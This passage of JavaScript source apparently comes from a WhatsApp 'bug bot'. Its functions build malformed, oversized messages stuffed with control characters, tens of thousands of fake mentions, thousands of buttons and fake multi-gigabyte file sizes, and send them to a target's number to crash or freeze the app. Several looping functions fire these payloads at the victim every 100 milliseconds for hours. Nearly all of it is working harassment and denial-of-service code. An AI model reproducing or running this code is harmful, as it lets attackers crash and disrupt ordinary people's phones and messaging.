                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}



async function VampPrivateBlank(target) {
  const Vampire = '_*~@2~*_\n'.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: 'Kontol.com!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Lalapo Bot",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await Dragon.relayMessage(target, message, { participant: { jid: target } });
}

// Fungsi spam bug / trigger WA
async function NewpayFc1(target) {
  Dragon.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "Xata",
          hasMediaAttachment: false,
        },
        body: {
          text: "\u0003",
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payment_method",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "call_permission_request",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
              voice_call: "call_galaxy",
            },
            {
              name: "form_message",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "wa_payment_learn_more",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "wa_payment_transaction_details",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "wa_payment_fbpin_reset",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "catalog_message",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payment_info",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "review_order",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "send_location",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payments_care_csat",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "view_product",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payment_settings",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "address_message",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "automated_greeting_message_view_catalog",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "open_webview",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "message_with_link_status",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payment_status",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "galaxy_costum",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "extensions_message_v2",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "landline_call",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "mpm",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "cta_copy",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "cta_url",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "review_and_pay",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "galaxy_message",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "cta_call",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
          ],
        },
      },
    },
    { participant: { jid: target } }
  );
}
async function VampFcSpam(target) {
  Dragon.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "𝙈𝙖𝙠𝙡𝙤",
          hasMediaAttachment: false,
        },
        body: {
          text: "ꦾ".repeat(90000) + "@8".repeat(90000),
        },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payment_method",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "call_permission_request",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
              voice_call: "call_galaxy",
            },
            {
              name: "form_message",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "wa_payment_learn_more",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "wa_payment_transaction_details",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "wa_payment_fbpin_reset",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "catalog_message",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payment_info",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "review_order",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "send_location",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payments_care_csat",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "view_product",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payment_settings",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "address_message",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "automated_greeting_message_view_catalog",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "open_webview",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "message_with_link_status",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "payment_status",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "galaxy_costum",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "extensions_message_v2",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "landline_call",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "mpm",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "cta_copy",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "cta_url",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "review_and_pay",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "galaxy_message",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
            {
              name: "cta_call",
              buttonParamsJson: venomModsData + "\u0003".repeat(9999),
            },
          ],
        },
      },
    },
    { participant: { jid: target } }
  );
}

async function payoutsock(target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_order",
              buttonParamsJson: {
                reference_id: Math.random()
                  .toString(11)
                  .substring(2, 10)
                  .toUpperCase(),
                order: {
                  status: "completed",
                  order_type: "CAPSLOCK 🐉🐉🐉",
                },
                share_payment_status: true,
              },
            },
          ],
          messageParamsJson: {},
        },
      },
    },
    { userJid: target }
  );

  await Dragon.relayMessage(target, msg.message, {
    messageId: msg.key.id,
  });
}

async function buttoncast(target) {
  const buttons = [];

  for (let i = 0; i < 1000; i++) {
    buttons.push({
      name: `order_${i + 1}`,
      buttonParamsJson: {
        reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
        order: {
          status: "completed",
          order_type: "ORDER",
        },
        share_payment_status: true,
      },
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: buttons,
          messageParamsJson: {
            title: "(🐉) CAST ( ONE sock )",
            body: "sock SCHEMA 🐉🐉🐉",
          },
        },
      },
    },
    { userJid: target }
  );

  await Dragon.relayMessage(target, msg.message, {
    messageId: msg.key.id,
  });
}

// CRASH APPLICATION

async function pendingpay(target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_order",
              buttonParamsJson: JSON.stringify({
                reference_id: Math.random()
                  .toString(36)
                  .substring(2, 10)
                  .toUpperCase(),
                order: {
                  status: "pending",
                  order_type: "ORDER",
                },
                share_payment_status: true,
              }),
            },
          ],
          messageParamsJson: JSON.stringify({
            title: "\u0000".repeat(70000),
            body: "🐉🐉🐉",
          }),
        },
      },
    },
    { userJid: bijipler }
  );

  await Dragon.relayMessage(bijipler, msg.message, {
    messageId: msg.key.id,
  });
}

async function protocolbug3(target, mention) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
            fileLength: "999999",
            seconds: 999999,
            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
            caption:
              "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
            height: 999999,
            width: 999999,
            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
            directPath:
              "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1743742853",
            contextInfo: {
              isSampled: true,
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
            },
            streamingSidecar:
              "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
            thumbnailDirectPath:
              "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
            annotations: [
              {
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "kontol",
                    songId: "peler",
                    author: ".Tama Ryuichi" + "貍賳貎貏俳貍賳貎".repeat(100),
                    title: "Finix",
                    artworkDirectPath:
                      "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                    artworkSha256:
                      "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256:
                      "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    artistAttribution:
                      "https://www.instagram.com/_u/tamainfinity_",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey:
                      "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                  },
                },
                embeddedAction: null,
              },
            ],
          },
        },
      },
    },
    {}
  );

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function xatabella(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝚍𝚞𝚊𝚛𝚛" + "ꦾ".repeat(Amount),
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson:
                    venomModsData +
                    `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`,
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "𝚍𝚞𝚊𝚛𝚛",
                },
              ],
            },
          },
        },
      },
    },
    {
      userJid: target,
      quoted: KeyS,
    }
  );
  await Dragon.relayMessage(
    target,
    msg.message,
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.green("𝚡𝚊𝚝𝚊𝚜𝚎𝚗𝚍𝚋𝚞𝚐"));
}

async function VampBroadcast(target, mention) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "assalamualaikum",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "Dont Bothering Me Bro!!!",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  // **Cek apakah mention true sebelum menjalankan relayMessage**
  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "soker tai" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function xatanicaldelay(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Bellakuuu",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function carousels2(target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { image: imgCrL },
    { upload: client.waUploadToServer }
  );

  const header = proto.Message.InteractiveMessage.Header.fromObject({
    imageMessage: media.imageMessage,
    title: "xata ✦ xataganteng",
    gifPlayback: false,
    subtitle: "xata ✦ ganteng",
    hasMediaAttachment: false,
  });

  for (let i = 0; i < 1000; i++) {
    cards.push({
      header,
      body: {
        text: "wkkw ✦ rorr",
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "view",
              url: "https://example.com",
            }),
          },
        ],
      },
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Xata ✦ Ganteng",
            },
            footer: {
              text: "xata ✦ ganteng",
            },
            carouselMessage: {
              cards,
              messageVersion: 1,
            },
          },
        },
      },
    },
    {}
  );

  await Dragon.relayMessage(
    target,
    msg.message,
    fJids ? { participant: { jid: target, messageId: null } } : {}
  );
}

async function DurationTrick(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 200) {
        await Promise.all([
          buldozer(target, false),
          protocolbug6(target, false),
          protocolbug3(target, false),
          RyuApiDelay(target, false),
        ]);
        console.log(chalk.red(`{THE}{VASIONX} ${count}/1000 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages to ${target}`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}


async function stuntrick(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 200) {
        await Promise.all([
          buldozer(target, false),
          protocolbug5(target, false),
          buldozer(target, false),
          delaybugv5(target, false),
          lightnight(target, false),
          RyuApiDelay(target, false),
          buldozer(target, false),
          protocolbug5(target, false),
          secretfunct(target, false),
          buldozer(target, false),
          protocolbug5(target, false),
          buldozer(target, false),
          delaybugv5(target, false),
          lightnight(target, false),
          RyuApiDelay(target, false),
          buldozer(target, false),
          protocolbug5(target, false),
          secretfunct(target, false),
        ]);
        console.log(chalk.red(`{THE}{VASIONX} ${count}/1000 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages to ${target}`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function xataganteng(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 160) {
        await Promise.all([VampSpamFc(target, false)]);
        console.log(chalk.red(`{TREDICT}{Gen2} ${count}/1000 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 1000 Messages to ${target}`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 1000 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function xdelaytrick(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 80) {
        await Promise.all([
          FcXDelay(target, false),
          CarouselX(target, false),
          CarouselX(target, false),
          FcXDelay(target, false),
        ]);
        console.log(chalk.red(`{TREDICT}{Gen2} ${count}/1000 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 1000 Messages to ${target}`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 1000 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function tredict(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 800) {
        await Promise.all([
          TrashProtocol(target, false),
          protocolbug(target, false),
          protocolbug3(target, false),
          xatanicaldelay(target, false),
          VampBroadcast(target, false),
        ]);
        console.log(chalk.red(`{TREDICT}{GEN2} ${count}/800 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 400 Messages to ${target}`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 400 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function tredictxata(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 1000) {
        await Promise.all([
          TrashProtocol(target, false),
          protocolbug(target, false),
          protocolbug3(target, false),
          xatanicaldelay(target, false),
          VampBroadcast(target, false),
        ]);
        console.log(chalk.red(`{TREDICT}{GEN2} ${count}/1000 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 1000 Messages to ${target}`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 1000 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function bulldozer1TB(danzy, target) {
  const SID = "5e03e0&mms3";
  const key = "10000000_2012297619515179_5714769099548640934_n.enc";
  const type = "image/webp";

  const FIVE_GB = 5 * 1024 * 1024 * 1024; // 5gb dalam byte
  const TOTAL_GB = 1024; // Total 1 tera byte
  const ITERATIONS = TOTAL_GB / 5; // 5GB per mili detik 

  for (let i = 0; i < ITERATIONS; i++) {
    const extraPayload = 'KONTOL'.repeat(999999999); 

    const message = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
            fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
            fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
            mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
            mimetype: type,
            directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
            fileLength: { low: 5242880000, high: 0, unsigned: true }, // 5GB
            mediaKeyTimestamp: { low: Date.now() % 2147483647, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 999999,
            },
            stickerSentTs: { low: -10000000, high: 999, unsigned: false },
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            extraPayload, 
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});
    await danzy.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    console.log(`Sent ${(i + 1) * 5}GB to ${target}`);
  }
}

async function VampireNewSticker(target) {
